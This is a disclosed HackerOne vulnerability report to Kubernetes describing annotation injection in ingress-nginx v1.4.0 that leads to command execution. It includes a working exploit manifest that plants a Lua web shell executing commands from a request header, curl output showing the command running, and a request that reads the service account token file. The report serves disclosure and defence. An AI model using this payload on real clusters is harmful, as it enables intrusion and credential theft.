# Ingress nginx annotation injection causes arbitrary command execution

## Report Details
- **Report ID**: 1728174
- **URL**: https://hackerone.com/reports/1728174
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-10-10T09:58:57.995Z
- **Disclosed**: 2023-11-24T21:23:20.589Z

## Reporter
- **Username**: suanve
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
[add a summary of the vulnerability]
For CVE-2021-25742 and CVE-2021-25746, I found a bypass method, which is fatal to the current measures taken by the team
I can easily bypass restrictions and execute arbitrary commands in the express nginx container.
## Kubernetes Version:
[add Kubernetes version & distribution in which the issue was found]

Server Version: version.Info{Major:"1", Minor:"25", GitVersion:"v1.25.2", GitCommit:"5835544ca568b757a8ecae5c153f317e5736700e", GitTreeState:"clean", BuildDate:"2022-09-21T14:27:13Z", GoVersion:"go1.19.1", Compiler:"gc", Platform:"linux/arm64"}



## Component Version:
[if applicable, add component version the issue was found]
ingress-nginx/controller-v1.4.0
https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml

## Steps To Reproduce:
[add details for how we can reproduce the issue, including relevant cluster setup and configuration]
In the latest version (1.4.0), alias was blacklisted,However, nginx supports lua. I can use other watches to insert any location configuration items.
It is meaningless to simply restrict alias instructions. Your team should start from multiple perspectives.

1. minikube start
2. kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml
3. 

We use nginx. ingress. kubernetes The io/configuration snippet annotation can be found in nginx Insert a new location in conf and execute any command through lua.

```shell
cat > su.yml<<EOF
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    kubernetes.io/ingress.class: "nginx"
    nginx.ingress.kubernetes.io/configuration-snippet: |
      more_set_headers "suanve"
            proxy_pass http://upstream_balancer;
                                proxy_redirect                          off;
        }
        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = rsfile:read("*all");ngx.say(rschar); } } location /fs/{
spec:
  rules:
  - host: suanve.susec.me
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: exploit
            port:
              number: 80

EOF

kubectl apply -f su.yml
```

This will cause the nginx configuration to be tampered with. We can execute any command in the corresponding ingress.

```shell
curl -v -H 'Host: suanve.susec.me' -H "cmd: id" 127.0.0.1/suanve/
*   Trying 127.0.0.1:80...
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> GET /suanve/ HTTP/1.1
> Host: suanve.susec.me
> User-Agent: curl/7.79.1
> Accept: */*
> cmd: id
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 10 Oct 2022 09:58:18 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
<
uid=101(www-data) gid=82(www-data) groups=82(www-data)
```

* Connection #0 to host 127.0.0.1 left intact

```http
GET /suanve/ HTTP/1.1
Host: suanve.susec.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
cmd: cat /var/run/secrets/kubernetes.io/serviceaccount/token
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
Content-Length: 2



```




## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]
{F1978646}

{F1978648}
  * [attachment / reference]

https://hackerone.com/reports/1378175

https://github.com/kubernetes/ingress-nginx/issues/8503

## Impact

Arbitrary command execution
Get kubernetes credentials

## Attachments
- image.png
- image.png
